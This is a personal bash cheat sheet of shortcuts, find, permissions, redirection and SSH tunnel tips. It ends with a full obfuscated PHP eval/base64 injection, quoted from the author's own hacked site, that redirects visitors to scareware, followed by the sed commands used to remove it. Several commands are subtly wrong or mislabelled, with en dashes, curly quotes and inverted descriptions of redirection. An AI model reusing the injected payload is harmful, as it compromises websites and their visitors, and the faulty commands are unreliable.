########## USEFULL SHORTCUTS ##########

!! - previous command

    rm -r /etc/orSomething
    sudo !! 

!$ - previous argument

    nano /home/user/path/to/file/that/i/dont/want/to/type/again.sh
    chmod 755 !$

!command - repeat last command

    find / -name "bla"
    !find
    find / -name "bla"

ctrl+r - find some previous command from bash history
ctrl+a - go to the beginning of the line
ctrl+e - go to the end of the line
ctrl+z - suspend current process. fg restores it
ctrl+u - clears the line before the cursor
ctrl+k - clears the line after the cursor

########## REDIRECT OUTPUT TO CLIPBOARD ##########

You need xclip:
    
    sudo apt-get install xclip

Pipe into the clipboard:

    cat foo.bar | xclip

foo.bar is now in you "middle click" clipboard.

If you want to use "ctrl+v":

    cat foo.bar | xclip -sel clip 

########## FIND #########

Finding files which has been modified less than one day:

	find . -mtime -1

List all the files and directories in the box which holds the 777 permission:

	find . -perm 777 –print

Case insensitive search -i

	find . –iname "foO" –print

Delete files that you find:

	find . -name *.foo -print | xargs rm –f

Find files with the word foo:

	find . –name *.txt –print | xargs grep “foo”



########## JOB CONTROL ##########

Run in background

    yourcommand &

Bring to foreground

    fg %jobid

Resume in background (if you won't the job to be running after ctrl+z)

    bg %jobid

List all jobs

    jobs
    
########## CHANGING PERMISSIONS ########## 

setting permissions for files and directories (644 for files and 755 for directories)

    sudo chmod 644 -R /var/www
    sudo find /var/www -type d -exec sudo chmod 755 '{}' \;

works faster than 
    sudo find /var/www -type f -exec sudo chmod 644 '{}' \;
    sudo find /var/www -type d -exec sudo chmod 755 '{}' \;

same thing a bit faster, but doesn't work with a large number of files
    sudo find /var/www -type f -print | xargs sudo chmod 644

########## REDIRECTING OUTPUT ##########

Redirect standard input

    find / -name foo > bar

Redirect standard error

    find / -name foo 2> bar
    
If you don't want to hide errors

    find / -name foo 2> /dev/null

########## RENAMING FILES ########## 

renames prefix foo* with bar* (but must have .extension)

    for file in foo.*; do mv {${file%%.*},bar}.${file#*.} ; done

quick rename 

    mv /path/to/fileOld /path/to/fileNew

or

    mv /path/to/file{Old,New}

delete all .svn folders

   find . -name ".svn" -type d -exec rm -rf '{}' \;

#works faster than 

    sudo find /var/www -type f -exec sudo chmod 644 '{}' \;
    sudo find /var/www -type d -exec sudo chmod 755 '{}' \;

#same thing a bit faster, but doesn't work with a large number of files
    
    sudo find /var/www -type f -print | xargs sudo chmod 644    

######## ENABLE WEBGL ##########

Get the xorg edgers ppa: https://launchpad.net/~xorg-edgers/+archive/radeon

    deb http://ppa.launchpad.net/xorg-edgers/radeon/ubuntu maverick main 
    
Fire up chrome:
    
    google-chrome --ignore-gpu-blacklist
    
or firefox:
    
    MOZ_GLX_IGNORE_BLACKLIST=1 firefox-4.0
    
I also installed:

    sudo apt-get install libgles2-mesa libegl1-mesa

but I'm not sure if this had anything to do with webgl :)
    
######### HOSTS IN SSH #########

You can make shortcuts for your favorite ssh hosts

Add a ~/.ssh/config file and write:

     Host derp
     HostName derp.herp.berp.net
     User derpyherpy

Now instead of typing

     ssh derpyherpy@derp.herp.berp.net

You can type

     ssh derp

(This also works for scp)
for more info 
     man ssh_config

############# SSH TUNNELS #############

lets say you want to ssh to a computer that's hidden behind a firelwall 

yourComp ---------- firewallyComp -------- destinationComp

     ssh -L10000:localhost:10001 firewallComp
     ssh -L10001:localhost:22 destinationComp

now you've just created a tunnel for your destinationComp and you can:

copy files directly from your computer to destination computer

     scp -P10000 file/I/Want/To.copy localhost:/home/Me/

or make another ssh tunnel to your destination comp

     ssh -p10000 -L 80:localhost:80 localhost

now you your port 80 will be directed to destinationComp port 80. 
notice how ssh has "p" and scp uses "P" for port.

############# REMOVES PHP REDIRECT TO SCAREWARE PAGE ###########

I while ago every PHP file on my website got this line of code prepended:
     
     <?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5b2IyeGhjMmx2Ym5kbFlpNWpiMjB2YjI4dWNHaHdJajQ4TDNOamNtbHdkRDQ9Iik7ICAgICAgfSAgICAgIHJldHVybiAiIjsgICAgIH0gICAgfSAgICAgICAgaWYoIWZ1bmN0aW9uX2V4aXN0cygnZ3pkZWNvZGUnKSl7ICAgICBmdW5jdGlvbiBnemRlY29kZSgkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDKXsgICAgICAkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEPUBvcmQoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLDMsMSkpOyAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9MTA7ICAgICAgJFJBM0Q1MkU1MkE0ODkzNkNERTBGNTM1NkJCMDg2NTJGMj0wOyAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmNCl7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9QHVucGFjaygndicsc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMTAsMikpOyAgICAgICAkUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCPSRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUJbMV07ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkrPTIrJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQjsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY4KXsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT1Ac3RycG9zKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsY2hyKDApLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKzE7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmMTYpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYyKXsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MjsgICAgICB9ICAgICAgJFIwMzRBRTJBQjk0Rjk5Q0M4MUIzODlBMTgyMkRBMzM1Mz1AZ3ppbmZsYXRlKEBzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSk7ICAgICAgaWYoJFIwMzRBRTJBQjk0Rjk5Q0M4MUIzODlBMTgyMkRBMzM1Mz09PUZBTFNFKXsgICAgICAgJFIwMzRBRTJBQjk0Rjk5Q0M4MUIzODlBMTgyMkRBMzM1Mz0kUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDOyAgICAgIH0gICAgICByZXR1cm4gJFIwMzRBRTJBQjk0Rjk5Q0M4MUIzODlBMTgyMkRBMzM1MzsgICAgIH0gICAgfSAgICBmdW5jdGlvbiBtcm9iaCgkUkU4MkVFOUIxMjFGNzA5ODk1RUY1NEVCQTdGQTZCNzhCKXsgICAgIEhlYWRlcignQ29udGVudC1FbmNvZGluZzogbm9uZScpOyAgICAgJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERT1nemRlY29kZSgkUkU4MkVFOUIxMjFGNzA5ODk1RUY1NEVCQTdGQTZCNzhCKTsgICAgICAgaWYocHJlZ19tYXRjaCgnL1w8XC9ib2R5L3NpJywkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFKSl7ICAgICAgcmV0dXJuIHByZWdfcmVwbGFjZSgnLyhcPFwvYm9keVteXD5dKlw+KS9zaScsZ21sKCkuIlxuIi4nJDEnLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpOyAgICAgfWVsc2V7ICAgICAgcmV0dXJuICRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUuZ21sKCk7ICAgICB9ICAgIH0gICAgb2Jfc3RhcnQoJ21yb2JoJyk7ICAgfSAgfQ=="));?>

These are the commands I used to remove the above line of code from every .php file:

     find $dir -name "*.php" -type f | xargs sed -i 's#<?php /\*\*/ eval(base64_decode("aWY.*?>##g' 2>&1
     find $dir -name "*.php" -type f | xargs sed -i '/./,$!d' 2>&1

(The first line removes the actual code while the second line removes the whitespace)
